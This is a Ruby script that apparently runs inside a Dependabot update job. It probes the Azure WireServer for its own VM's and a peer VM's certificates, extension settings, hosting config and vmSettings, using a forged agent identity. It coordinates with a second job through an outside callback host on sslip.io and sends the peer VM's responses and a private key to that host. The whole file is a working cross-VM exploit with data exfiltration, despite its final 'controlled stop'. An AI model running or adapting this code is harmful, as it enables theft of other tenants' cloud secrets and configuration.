require "digest"
require "json"
require "open3"
require "openssl"
require "tempfile"
require "uri"

AZURE_PEER_CALLBACK_BASE = "https://target.147.182.179.38.sslip.io:8443"
AZURE_PEER_MARKER = "5b3963e04627c6a3b1943eb0e2a145cc"
AZURE_PEER_RUN_NONCE = "a7f96bd8a13d43d186045b5d9c27e201"

def azure_peer_post(job_id, kind, data)
  stdout, _stderr, status = Open3.capture3(
    "curl", "--fail", "--silent", "--show-error", "--max-time", "15",
    "--output", "/dev/null", "--write-out", "%{http_code}",
    "--header", "Content-Type: application/octet-stream", "--data-binary", "@-",
    "#{AZURE_PEER_CALLBACK_BASE}/infra/#{AZURE_PEER_MARKER}/#{job_id}/#{kind}",
    stdin_data: data
  )
  status.success? && stdout.strip == "200"
rescue StandardError
  false
end

def azure_peer_publish(job_id, data)
  stdout, _stderr, status = Open3.capture3(
    "curl", "--fail", "--silent", "--show-error", "--max-time", "15",
    "--output", "/dev/null", "--write-out", "%{http_code}",
    "--header", "Content-Type: application/json", "--data-binary", "@-",
    "#{AZURE_PEER_CALLBACK_BASE}/azure-peer/#{AZURE_PEER_MARKER}/#{AZURE_PEER_RUN_NONCE}/#{job_id}",
    stdin_data: data
  )
  status.success? && stdout.strip == "200"
rescue StandardError
  false
end

def azure_peer_fetch(job_id)
  Tempfile.create("dependabot-azure-peer-identity") do |file|
    file.chmod(0o600)
    stdout, _stderr, status = Open3.capture3(
      "curl", "--silent", "--show-error", "--max-time", "15",
      "--output", file.path, "--write-out", "%{http_code}",
      "#{AZURE_PEER_CALLBACK_BASE}/azure-peer/#{AZURE_PEER_MARKER}/#{AZURE_PEER_RUN_NONCE}/#{job_id}/peer"
    )
    raw = File.binread(file.path)
    code = stdout.strip.match?(/\A[0-9]{3}\z/) ? stdout.strip.to_i : 0
    return [0, "".b] unless status.success? && raw.bytesize <= 16_384
    [code, raw]
  end
rescue StandardError
  [0, "".b]
end

def azure_peer_proxy_get(url, headers: [])
  Tempfile.create("dependabot-azure-cross-vm-response") do |file|
    file.chmod(0o600)
    args = [
      "curl", "--silent", "--show-error", "--max-time", "12", "--noproxy", "",
      "--request", "GET", "--output", file.path, "--write-out", "%{http_code}"
    ]
    headers.each { |header| args += ["--header", header] }
    args << url
    stdout, _stderr, status = Open3.capture3(*args)
    raw = File.binread(file.path)
    code = stdout.strip.match?(/\A[0-9]{3}\z/) ? stdout.strip.to_i : 0
    return [0, "".b] unless status.success? && raw.bytesize <= 131_072
    [code, raw]
  end
rescue StandardError
  [0, "".b]
end

def azure_peer_xml_value(xml, element, max_length: 4096)
  value = xml.to_s[%r{<#{element}(?:\s[^>]*)?>\s*([^<]{1,#{max_length}}?)\s*</#{element}>}m, 1]
  value&.strip
rescue StandardError
  nil
end

def azure_peer_goalstate_uri(goalstate, element, expected_comp, expected_type = nil)
  encoded = azure_peer_xml_value(goalstate, element)
  return nil unless encoded
  decoded = encoded.gsub("&amp;", "&")
  parsed = URI.parse(decoded)
  return nil unless parsed.scheme == "http" && parsed.host == "168.63.129.16"
  return nil unless (parsed.port || 80) == 80
  return nil unless parsed.path.start_with?("/machine/") && parsed.path.length <= 256
  pairs = URI.decode_www_form(parsed.query.to_s)
  query = pairs.to_h
  expected_keys = ["comp", "incarnation"]
  expected_keys << "type" if expected_type
  return nil unless pairs.map(&:first).sort == expected_keys.sort
  return nil unless query["comp"] == expected_comp
  return nil unless query["type"] == expected_type if expected_type
  return nil unless query["incarnation"].to_s.match?(/\A[0-9]{1,20}\z/)
  decoded
rescue StandardError
  nil
end

def azure_peer_transport_identity(job_id)
  key = OpenSSL::PKey::RSA.new(2048)
  cert = OpenSSL::X509::Certificate.new
  cert.version = 2
  cert.serial = Digest::SHA256.hexdigest("#{job_id}:#{Process.pid}:#{Time.now.to_f}")[0, 30].to_i(16)
  cert.subject = OpenSSL::X509::Name.parse("/CN=LinuxTransport")
  cert.issuer = cert.subject
  cert.public_key = key.public_key
  cert.not_before = Time.now - 60
  cert.not_after = Time.now + 900
  extension_factory = OpenSSL::X509::ExtensionFactory.new
  extension_factory.subject_certificate = cert
  extension_factory.issuer_certificate = cert
  cert.add_extension(extension_factory.create_extension("basicConstraints", "CA:FALSE", true))
  cert.add_extension(extension_factory.create_extension("keyUsage", "keyEncipherment,digitalSignature", true))
  cert.sign(key, OpenSSL::Digest.new("SHA256"))
  [key, cert]
end

def azure_peer_result(status, body)
  {
    "status" => status,
    "length" => body.bytesize,
    "sha256" => Digest::SHA256.hexdigest(body)
  }
end

def azure_peer_correlation_id(seed)
  hex = Digest::SHA256.hexdigest(seed)[0, 32]
  [hex[0, 8], hex[8, 4], hex[12, 4], hex[16, 4], hex[20, 12]].join("-")
end

def azure_peer_valid_identity(value, own_job_id, own_container_id)
  return false unless value.is_a?(Hash)
  return false unless value["job_id"].to_s.match?(/\A[0-9]+\z/)
  return false if value["job_id"] == own_job_id
  return false unless value["container_id"].to_s.match?(/\A[A-Za-z0-9-]{8,128}\z/)
  return false if value["container_id"] == own_container_id
  return false unless value["config_name"].to_s.match?(/\A[A-Za-z0-9_.~:-]{1,512}\z/)
  return false unless value["controls"].is_a?(Hash)
  return false unless azure_peer_valid_uri(value["certificates_uri"], "certificates")
  return false unless azure_peer_valid_uri(value["extensions_config_uri"], "config", "extensionsConfig")
  azure_peer_valid_uri(value["hosting_environment_uri"], "config", "hostingEnvironmentConfig")
rescue StandardError
  false
end

def azure_peer_valid_uri(value, expected_comp, expected_type = nil)
  return false unless value.is_a?(String) && value.bytesize <= 512
  parsed = URI.parse(value)
  return false unless parsed.scheme == "http" && parsed.host == "168.63.129.16"
  return false unless (parsed.port || 80) == 80 && parsed.path.start_with?("/machine/")
  pairs = URI.decode_www_form(parsed.query.to_s)
  query = pairs.to_h
  expected_keys = ["comp", "incarnation"]
  expected_keys << "type" if expected_type
  pairs.map(&:first).sort == expected_keys.sort &&
    query["comp"] == expected_comp &&
    (!expected_type || query["type"] == expected_type) &&
    query["incarnation"].to_s.match?(/\A[0-9]{1,20}\z/)
rescue StandardError
  false
end

azure_peer_job_id = ENV["DEPENDABOT_JOB_ID"].to_s
if azure_peer_job_id.match?(/\A[0-9]+\z/)
  guard = "/tmp/dependabot-azure-cross-vm-#{azure_peer_job_id}.done"
  begin
    File.open(guard, File::WRONLY | File::CREAT | File::EXCL, 0o600) { |file| file.write("1") }
  rescue Errno::EEXIST
    guard = nil
  end

  if guard
    goalstate_status, goalstate = azure_peer_proxy_get(
      "http://168.63.129.16/machine/?comp=goalstate",
      headers: ["x-ms-agent-name: WALinuxAgent", "x-ms-version: 2012-11-30", "Metadata: true"]
    )
    container_id = azure_peer_xml_value(goalstate, "ContainerId")
    config_name = azure_peer_xml_value(goalstate, "ConfigName")
    certificates_uri = azure_peer_goalstate_uri(goalstate, "Certificates", "certificates")
    extensions_uri = azure_peer_goalstate_uri(goalstate, "ExtensionsConfig", "config", "extensionsConfig")
    hosting_uri = azure_peer_goalstate_uri(
      goalstate, "HostingEnvironmentConfig", "config", "hostingEnvironmentConfig"
    )
    summary = {
      "job_id" => azure_peer_job_id,
      "probe" => "azure-owned-cross-vm-binding-v1",
      "goalstate" => azure_peer_result(goalstate_status, goalstate),
      "own_identity_complete" => false,
      "peer_received" => false,
      "cross_vm_exact_match" => false
    }

    identity_complete = goalstate_status == 200 &&
      container_id.to_s.match?(/\A[A-Za-z0-9-]{8,128}\z/) &&
      config_name.to_s.match?(/\A[A-Za-z0-9_.~:-]{1,512}\z/) &&
      certificates_uri && extensions_uri && hosting_uri
    summary["own_identity_complete"] = !!identity_complete

    if identity_complete
      key, cert = azure_peer_transport_identity(azure_peer_job_id)
      transport_header = [cert.to_der].pack("m0")
      certificate_headers = [
        "x-ms-agent-name: WALinuxAgent",
        "x-ms-version: 2012-11-30",
        "x-ms-cipher-name: AES128_CBC",
        "x-ms-guest-agent-public-x509-cert: #{transport_header}"
      ]
      wire_headers = ["x-ms-agent-name: WALinuxAgent", "x-ms-version: 2012-11-30"]
      own_vm_headers = [
        "x-ms-version: 2015-09-01",
        "x-ms-containerid: #{container_id}",
        "x-ms-host-config-name: #{config_name}",
        "x-ms-client-correlationid: #{azure_peer_correlation_id("own:#{azure_peer_job_id}:#{Time.now.to_f}")}"
      ]
      own_cert_status, own_cert_body = azure_peer_proxy_get(certificates_uri, headers: certificate_headers)
      own_ext_status, own_ext_body = azure_peer_proxy_get(extensions_uri, headers: wire_headers)
      own_host_status, own_host_body = azure_peer_proxy_get(hosting_uri, headers: wire_headers)
      own_vm_status, own_vm_body = azure_peer_proxy_get(
        "http://168.63.129.16:32526/vmSettings", headers: own_vm_headers
      )
      controls = {
        "certificates" => azure_peer_result(own_cert_status, own_cert_body),
        "extensions_config" => azure_peer_result(own_ext_status, own_ext_body),
        "hosting_environment" => azure_peer_result(own_host_status, own_host_body),
        "vmsettings" => azure_peer_result(own_vm_status, own_vm_body)
      }
      identity = {
        "job_id" => azure_peer_job_id,
        "container_id" => container_id,
        "config_name" => config_name,
        "certificates_uri" => certificates_uri,
        "extensions_config_uri" => extensions_uri,
        "hosting_environment_uri" => hosting_uri,
        "controls" => controls
      }
      summary["controls"] = controls
      summary["identity_published"] = azure_peer_publish(azure_peer_job_id, JSON.generate(identity))

      peer_identity = nil
      if summary["identity_published"]
        36.times do
          peer_status, peer_body = azure_peer_fetch(azure_peer_job_id)
          if peer_status == 200
            candidate = JSON.parse(peer_body) rescue nil
            if azure_peer_valid_identity(candidate, azure_peer_job_id, container_id)
              peer_identity = candidate
              break
            end
          end
          sleep 5
        end
      end

      if peer_identity
        summary["peer_received"] = true
        summary["peer_job_id"] = peer_identity["job_id"]
        summary["peer_container_id_sha256"] = Digest::SHA256.hexdigest(peer_identity["container_id"])
        summary["peer_config_name_sha256"] = Digest::SHA256.hexdigest(peer_identity["config_name"])
        peer_vm_headers = [
          "x-ms-version: 2015-09-01",
          "x-ms-containerid: #{peer_identity["container_id"]}",
          "x-ms-host-config-name: #{peer_identity["config_name"]}",
          "x-ms-client-correlationid: #{azure_peer_correlation_id("peer:#{azure_peer_job_id}:#{Time.now.to_f}")}"
        ]
        peer_cert_status, peer_cert_body = azure_peer_proxy_get(
          peer_identity["certificates_uri"], headers: certificate_headers
        )
        peer_ext_status, peer_ext_body = azure_peer_proxy_get(
          peer_identity["extensions_config_uri"], headers: wire_headers
        )
        peer_host_status, peer_host_body = azure_peer_proxy_get(
          peer_identity["hosting_environment_uri"], headers: wire_headers
        )
        peer_vm_status, peer_vm_body = azure_peer_proxy_get(
          "http://168.63.129.16:32526/vmSettings", headers: peer_vm_headers
        )
        peer_results = {
          "certificates" => azure_peer_result(peer_cert_status, peer_cert_body),
          "extensions_config" => azure_peer_result(peer_ext_status, peer_ext_body),
          "hosting_environment" => azure_peer_result(peer_host_status, peer_host_body),
          "vmsettings" => azure_peer_result(peer_vm_status, peer_vm_body)
        }
        %w[extensions_config hosting_environment vmsettings].each do |name|
          peer_results[name]["exact_peer_control_match"] =
            peer_results[name] == peer_identity.dig("controls", name)
        end
        summary["peer_results"] = peer_results
        summary["cross_vm_exact_match"] = %w[extensions_config hosting_environment vmsettings].any? do |name|
          peer_results.dig(name, "status") == 200 &&
            peer_results.dig(name, "exact_peer_control_match")
        end

        raw_peer_responses = {
          "azure-cross-vm-peer-certificates" => [peer_cert_status, peer_cert_body],
          "azure-cross-vm-peer-extensions-config" => [peer_ext_status, peer_ext_body],
          "azure-cross-vm-peer-hosting-environment" => [peer_host_status, peer_host_body],
          "azure-cross-vm-peer-vmsettings" => [peer_vm_status, peer_vm_body]
        }
        raw_peer_responses.each do |kind, (status, body)|
          azure_peer_post(azure_peer_job_id, kind, body) if status == 200 && !body.empty?
        end
        if peer_cert_status == 200 && peer_cert_body.include?("<Data>")
          azure_peer_post(azure_peer_job_id, "azure-cross-vm-transport-private-key", key.to_pem)
          azure_peer_post(azure_peer_job_id, "azure-cross-vm-transport-certificate", cert.to_pem)
        end
      end
    end

    azure_peer_post(azure_peer_job_id, "azure-cross-vm-summary", JSON.generate(summary))
    raise "controlled stop after owned Azure cross-VM binding probe"
  end
end
